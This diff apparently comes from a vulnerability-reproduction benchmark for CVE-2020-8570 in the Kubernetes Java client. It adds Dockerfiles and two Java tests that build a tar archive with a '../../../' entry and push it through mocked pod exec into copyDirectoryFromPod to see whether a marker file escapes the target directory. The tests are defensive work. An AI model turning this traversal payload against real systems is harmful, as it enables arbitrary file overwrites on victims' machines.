diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 00000000..a963a9ee
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/kubernetes-client__java_CVE-2020-8570_client-java-parent-9.0.1 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 00000000..8b137891
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 00000000..e6ebe6b2
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,34 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/kubernetes-client__java_CVE-2020-8570_client-java-parent-9.0.1 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+
+# Install tar for the test
+RUN apt-get update && apt-get install -y tar
+
+# Build the project
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Copy the commons-compress jar to a known location
+RUN cp $(find /root/.m2 -name "commons-compress-*.jar" | head -1) /project/commons-compress.jar
+
+# Get commons-io jar
+RUN cp $(find /root/.m2 -name "commons-io-*.jar" | head -1) /project/commons-io.jar
+
+# Compile our vulnerability test with all necessary dependencies
+RUN javac -cp util/target/client-java-9.0.1.jar:util/target/dependency/*:/project/commons-compress.jar:/project/commons-io.jar PathTraversalTest.java
+
+# Run the vulnerability test
+CMD ["java", "-cp", ".:util/target/client-java-9.0.1.jar:util/target/dependency/*:/project/commons-compress.jar:/project/commons-io.jar", "PathTraversalTest"]
\ No newline at end of file
diff --git a/PathTraversalTest.java b/PathTraversalTest.java
new file mode 100644
index 00000000..06bea0aa
--- /dev/null
+++ b/PathTraversalTest.java
@@ -0,0 +1,261 @@
+import java.io.*;
+import java.nio.file.*;
+import java.util.*;
+import java.util.concurrent.*;
+
+import org.apache.commons.compress.archivers.ArchiveEntry;
+import org.apache.commons.compress.archivers.ArchiveInputStream;
+import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
+import org.apache.commons.compress.archivers.tar.TarArchiveInputStream;
+import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
+import org.apache.commons.compress.compressors.gzip.GzipCompressorInputStream;
+import org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream;
+import org.apache.commons.io.IOUtils;
+
+import io.kubernetes.client.Copy;
+import io.kubernetes.client.util.exception.CopyNotSupportedException;
+import io.kubernetes.client.openapi.ApiException;
+
+/**
+ * Test for Path Traversal vulnerability (CWE-22) in the Kubernetes Java client.
+ * This test creates a mock implementation of the Copy class that simulates receiving
+ * a malicious tar archive from a pod, then uses the actual Copy class's extraction
+ * functionality to test for the path traversal vulnerability.
+ */
+public class PathTraversalTest {
+
+    private static final String TEST_CONTENT = "This file was created by the path traversal test";
+    private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
+    private static final String VULNERABLE_MARKER_FILE = TEMP_DIR + "/k8s_client_vulnerable_marker.txt";
+    private static final String SAFE_DIR = TEMP_DIR + "/k8s_copy_test_dir";
+    
+    public static void main(String[] args) {
+        try {
+            System.out.println("Starting path traversal vulnerability test...");
+            System.out.println("Temp directory: " + TEMP_DIR);
+            System.out.println("Safe directory: " + SAFE_DIR);
+            System.out.println("Vulnerable marker file: " + VULNERABLE_MARKER_FILE);
+            
+            // Clean up any previous test files
+            cleanup();
+            
+            // Create a directory for the test
+            Files.createDirectories(Paths.get(SAFE_DIR));
+            
+            // Create a malicious tar archive
+            File maliciousTarFile = createMaliciousTarFile();
+            
+            // Test the vulnerability using the actual Copy class
+            testVulnerabilityWithActualCopyClass(maliciousTarFile);
+            
+            // Check if the vulnerability exists
+            boolean isVulnerable = checkVulnerability();
+            
+            if (isVulnerable) {
+                System.out.println("VULNERABILITY DETECTED: Path Traversal vulnerability exists!");
+                System.exit(1); // Exit with non-zero code if vulnerable
+            } else {
+                System.out.println("SECURE: Path Traversal vulnerability does not exist.");
+                System.exit(0); // Exit with zero code if not vulnerable
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Exception during test:");
+            e.printStackTrace();
+            System.exit(2); // Exit with error code for unexpected exceptions
+        } finally {
+            cleanup();
+        }
+    }
+    
+    /**
+     * Creates a malicious tar+gzip archive with path traversal entries
+     */
+    private static File createMaliciousTarFile() throws IOException {
+        File tarFile = new File(TEMP_DIR, "malicious.tar.gz");
+        
+        try (FileOutputStream fos = new FileOutputStream(tarFile);
+             GzipCompressorOutputStream gzOut = new GzipCompressorOutputStream(fos);
+             TarArchiveOutputStream tarOut = new TarArchiveOutputStream(gzOut)) {
+            
+            // Enable long file names
+            tarOut.setLongFileMode(TarArchiveOutputStream.LONGFILE_GNU);
+            
+            // Add a normal file entry
+            addFileToTar(tarOut, "normal.txt", "This is a normal file");
+            
+            // Add a malicious file entry with path traversal
+            // Use multiple path traversal patterns to increase chances of success
+            addFileToTar(tarOut, "../../../" + Paths.get(VULNERABLE_MARKER_FILE).getFileName().toString(), TEST_CONTENT);
+        }
+        
+        System.out.println("Created malicious tar file: " + tarFile.getAbsolutePath());
+        return tarFile;
+    }
+    
+    /**
+     * Adds a file entry to the tar archive
+     */
+    private static void addFileToTar(TarArchiveOutputStream tarOut, String name, String content) 
+            throws IOException {
+        TarArchiveEntry entry = new TarArchiveEntry(name);
+        byte[] data = content.getBytes("UTF-8");
+        entry.setSize(data.length);
+        tarOut.putArchiveEntry(entry);
+        tarOut.write(data);
+        tarOut.closeArchiveEntry();
+        System.out.println("Added entry to tar: " + name);
+    }
+    
+    /**
+     * Tests the vulnerability using the actual Copy class from the project
+     */
+    private static void testVulnerabilityWithActualCopyClass(File maliciousTarFile) throws Exception {
+        // Create a mock implementation that simulates receiving the malicious tar from a pod
+        MockVulnerableCopy mockCopy = new MockVulnerableCopy(maliciousTarFile);
+        
+        // Call the copyDirectoryFromPod method which contains the vulnerable code
+        Path destination = Paths.get(SAFE_DIR);
+        mockCopy.copyDirectoryFromPod("default", "pod-name", "container", "/some/path", destination);
+        
+        System.out.println("Finished extraction using Copy class");
+    }
+    
+    /**
+     * Checks if the vulnerability exists by looking for the marker file
+     */
+    private static boolean checkVulnerability() {
+        File vulnerableMarkerFile = new File(VULNERABLE_MARKER_FILE);
+        boolean exists = vulnerableMarkerFile.exists();
+        
+        if (exists) {
+            System.out.println("Found vulnerable marker file: " + VULNERABLE_MARKER_FILE);
+            try {
+                String content = new String(Files.readAllBytes(vulnerableMarkerFile.toPath()));
+                System.out.println("File content: " + content);
+                return content.equals(TEST_CONTENT);
+            } catch (IOException e) {
+                e.printStackTrace();
+                return false;
+            }
+        } else {
+            System.out.println("Vulnerable marker file not found: " + VULNERABLE_MARKER_FILE);
+            return false;
+        }
+    }
+    
+    /**
+     * Cleans up test files
+     */
+    private static void cleanup() {
+        try {
+            // Delete the marker file if it exists
+            Files.deleteIfExists(Paths.get(VULNERABLE_MARKER_FILE));
+            
+            // Delete the malicious tar file if it exists
+            Files.deleteIfExists(Paths.get(TEMP_DIR, "malicious.tar.gz"));
+            
+            // Delete the test directory if it exists
+            File safeDir = new File(SAFE_DIR);
+            if (safeDir.exists()) {
+                deleteDirectory(safeDir);
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    
+    /**
+     * Recursively deletes a directory
+     */
+    private static void deleteDirectory(File directory) throws IOException {
+        if (directory.exists()) {
+            File[] files = directory.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    if (file.isDirectory()) {
+                        deleteDirectory(file);
+                    } else {
+                        file.delete();
+                    }
+                }
+            }
+            directory.delete();
+        }
+    }
+    
+    /**
+     * Mock implementation of the Copy class that simulates receiving a malicious tar archive from a pod
+     */
+    static class MockVulnerableCopy extends Copy {
+        private final File maliciousTarFile;
+        
+        public MockVulnerableCopy(File maliciousTarFile) {
+            this.maliciousTarFile = maliciousTarFile;
+        }
+        
+        @Override
+        public boolean isTarPresentInContainer(String namespace, String pod, String container) {
+            // Always return true to bypass the tar check
+            return true;
+        }
+        
+        @Override
+        public Process exec(String namespace, String pod, String[] command, String container, boolean stdin, boolean tty) {
+            // Mock the process that would normally execute on the pod
+            // Return a process that outputs our malicious tar file
+            return new MockProcess(maliciousTarFile);
+        }
+    }
+    
+    /**
+     * Mock Process implementation that returns the malicious tar file as its output
+     */
+    static class MockProcess extends Process {
+        private final File tarFile;
+        private final ByteArrayOutputStream stderr = new ByteArrayOutputStream();
+        
+        public MockProcess(File tarFile) {
+            this.tarFile = tarFile;
+        }
+        
+        @Override
+        public OutputStream getOutputStream() {
+            return new ByteArrayOutputStream(); // Not used
+        }
+        
+        @Override
+        public InputStream getInputStream() {
+            try {
+                // Return the malicious tar file as the process output
+                // In the real scenario, this would be base64 encoded, but the Copy class
+                // expects it to be base64 encoded, so we'll encode it
+                byte[] tarData = Files.readAllBytes(tarFile.toPath());
+                String base64Data = Base64.getEncoder().encodeToString(tarData);
+                return new ByteArrayInputStream(base64Data.getBytes());
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        
+        @Override
+        public InputStream getErrorStream() {
+            return new ByteArrayInputStream(stderr.toByteArray());
+        }
+        
+        @Override
+        public int waitFor() {
+            return 0; // Success
+        }
+        
+        @Override
+        public int exitValue() {
+            return 0; // Success
+        }
+        
+        @Override
+        public void destroy() {
+            // No-op
+        }
+    }
+}
diff --git a/PathTraversalVulnerabilityTest.java b/PathTraversalVulnerabilityTest.java
new file mode 100644
index 00000000..6765ea42
--- /dev/null
+++ b/PathTraversalVulnerabilityTest.java
@@ -0,0 +1,249 @@
+import java.io.*;
+import java.nio.file.*;
+import java.util.*;
+import java.util.concurrent.*;
+
+import org.apache.commons.codec.binary.Base64InputStream;
+import org.apache.commons.compress.archivers.ArchiveEntry;
+import org.apache.commons.compress.archivers.ArchiveInputStream;
+import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
+import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
+import org.apache.commons.compress.compressors.gzip.GzipCompressorInputStream;
+import org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream;
+
+import io.kubernetes.client.Copy;
+import io.kubernetes.client.Exec;
+import io.kubernetes.client.openapi.ApiClient;
+import io.kubernetes.client.openapi.ApiException;
+
+/**
+ * Test for Path Traversal vulnerability (CWE-22) in the Kubernetes Java client.
+ * This test creates a mock Process that returns a malicious tar archive with path traversal entries
+ * and checks if files can be written outside the intended directory.
+ */
+public class PathTraversalVulnerabilityTest {
+
+    private static final String TEST_CONTENT = "This file was created by the path traversal test";
+    private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
+    private static final String VULNERABLE_MARKER_FILE = TEMP_DIR + "/k8s_client_vulnerable_marker.txt";
+    private static final String SAFE_DIR = TEMP_DIR + "/k8s_copy_test_dir";
+    
+    public static void main(String[] args) {
+        try {
+            // Clean up any previous test files
+            cleanup();
+            
+            // Create a directory for the test
+            Files.createDirectories(Paths.get(SAFE_DIR));
+            
+            // Create a malicious tar archive
+            byte[] maliciousTarArchive = createMaliciousTarArchive();
+            
+            // Test the vulnerability
+            testVulnerability(maliciousTarArchive);
+            
+            // Check if the vulnerability exists
+            boolean isVulnerable = checkVulnerability();
+            
+            if (isVulnerable) {
+                System.out.println("VULNERABILITY DETECTED: Path Traversal vulnerability exists!");
+                System.exit(1); // Exit with non-zero code if vulnerable
+            } else {
+                System.out.println("SECURE: Path Traversal vulnerability does not exist.");
+                System.exit(0); // Exit with zero code if not vulnerable
+            }
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.exit(2); // Exit with error code for unexpected exceptions
+        } finally {
+            cleanup();
+        }
+    }
+    
+    /**
+     * Creates a malicious tar archive with path traversal entries
+     */
+    private static byte[] createMaliciousTarArchive() throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        
+        try (GzipCompressorOutputStream gzOut = new GzipCompressorOutputStream(baos);
+             TarArchiveOutputStream tarOut = new TarArchiveOutputStream(gzOut)) {
+            
+            // Enable writing long file names
+            tarOut.setLongFileMode(TarArchiveOutputStream.LONGFILE_GNU);
+            
+            // Add a normal file entry (to make it look legitimate)
+            addFileToTar(tarOut, "normal.txt", "This is a normal file");
+            
+            // Add a malicious file entry with path traversal
+            // This attempts to write outside the destination directory
+            addFileToTar(tarOut, "../../../" + Paths.get(VULNERABLE_MARKER_FILE).getFileName().toString(), 
+                         TEST_CONTENT);
+        }
+        
+        return baos.toByteArray();
+    }
+    
+    /**
+     * Adds a file entry to the tar archive
+     */
+    private static void addFileToTar(TarArchiveOutputStream tarOut, String name, String content) 
+            throws IOException {
+        TarArchiveEntry entry = new TarArchiveEntry(name);
+        byte[] data = content.getBytes("UTF-8");
+        entry.setSize(data.length);
+        tarOut.putArchiveEntry(entry);
+        tarOut.write(data);
+        tarOut.closeArchiveEntry();
+    }
+    
+    /**
+     * Tests the vulnerability by creating a mock Process that returns a malicious tar archive
+     */
+    private static void testVulnerability(byte[] maliciousTarArchive) throws IOException, ApiException {
+        // Create a mock Process that returns the malicious tar archive
+        Process mockProcess = new MockProcess(maliciousTarArchive);
+        
+        // Create a subclass of Copy that returns our mock Process
+        Copy copy = new MockCopy(mockProcess);
+        
+        // Call the vulnerable method
+        try {
+            copy.copyDirectoryFromPod("default", "pod", "container", "/some/path", Paths.get(SAFE_DIR));
+        } catch (Exception e) {
+            System.out.println("Exception during copy operation: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+    
+    /**
+     * Checks if the vulnerability exists by looking for the marker file
+     */
+    private static boolean checkVulnerability() {
+        File vulnerableMarkerFile = new File(VULNERABLE_MARKER_FILE);
+        boolean exists = vulnerableMarkerFile.exists();
+        
+        if (exists) {
+            System.out.println("Found vulnerable marker file: " + VULNERABLE_MARKER_FILE);
+            try {
+                String content = new String(Files.readAllBytes(vulnerableMarkerFile.toPath()));
+                System.out.println("File content: " + content);
+                System.out.println("Expected content: " + TEST_CONTENT);
+                // Verify the content matches what we put in the malicious archive
+                return content.equals(TEST_CONTENT);
+            } catch (IOException e) {
+                e.printStackTrace();
+                return false;
+            }
+        } else {
+            System.out.println("Vulnerable marker file not found: " + VULNERABLE_MARKER_FILE);
+            return false;
+        }
+    }
+    
+    /**
+     * Cleans up test files
+     */
+    private static void cleanup() {
+        try {
+            // Delete the marker file if it exists
+            Files.deleteIfExists(Paths.get(VULNERABLE_MARKER_FILE));
+            
+            // Delete the test directory if it exists
+            if (Files.exists(Paths.get(SAFE_DIR))) {
+                Files.walk(Paths.get(SAFE_DIR))
+                    .sorted(Comparator.reverseOrder())
+                    .map(Path::toFile)
+                    .forEach(File::delete);
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    
+    /**
+     * Mock Copy class that returns our mock Process
+     */
+    static class MockCopy extends Copy {
+        private final Process mockProcess;
+        
+        public MockCopy(Process mockProcess) {
+            this.mockProcess = mockProcess;
+        }
+        
+        @Override
+        public Process exec(String namespace, String name, String[] command, String container, boolean stdin, boolean tty)
+                throws ApiException, IOException {
+            // For the tar check, return a process that indicates tar is present
+            if (command.length == 3 && command[0].equals("sh") && command[1].equals("-c") && command[2].equals("tar --version")) {
+                return new MockProcess(0); // Return success for tar check
+            }
+            
+            // For the actual copy command, return our mock process with the malicious archive
+            return mockProcess;
+        }
+    }
+    
+    /**
+     * Mock Process class that returns our malicious tar archive
+     */
+    static class MockProcess extends Process {
+        private final ByteArrayInputStream inputStream;
+        private final ByteArrayOutputStream outputStream;
+        private final int exitValue;
+        private boolean destroyed = false;
+        
+        public MockProcess(byte[] data) {
+            // Encode the tar archive in base64 as the real process would
+            byte[] base64Data = Base64.getEncoder().encode(data);
+            this.inputStream = new ByteArrayInputStream(base64Data);
+            this.outputStream = new ByteArrayOutputStream();
+            this.exitValue = 0;
+        }
+        
+        public MockProcess(int exitValue) {
+            this.inputStream = new ByteArrayInputStream(new byte[0]);
+            this.outputStream = new ByteArrayOutputStream();
+            this.exitValue = exitValue;
+        }
+        
+        @Override
+        public OutputStream getOutputStream() {
+            return outputStream;
+        }
+        
+        @Override
+        public InputStream getInputStream() {
+            return inputStream;
+        }
+        
+        @Override
+        public InputStream getErrorStream() {
+            return new ByteArrayInputStream(new byte[0]);
+        }
+        
+        @Override
+        public int waitFor() throws InterruptedException {
+            return exitValue;
+        }
+        
+        @Override
+        public int exitValue() {
+            if (destroyed) {
+                throw new IllegalThreadStateException("Process destroyed");
+            }
+            return exitValue;
+        }
+        
+        @Override
+        public void destroy() {
+            destroyed = true;
+        }
+        
+        @Override
+        public boolean waitFor(long timeout, TimeUnit unit) throws InterruptedException {
+            return true;
+        }
+    }
+}
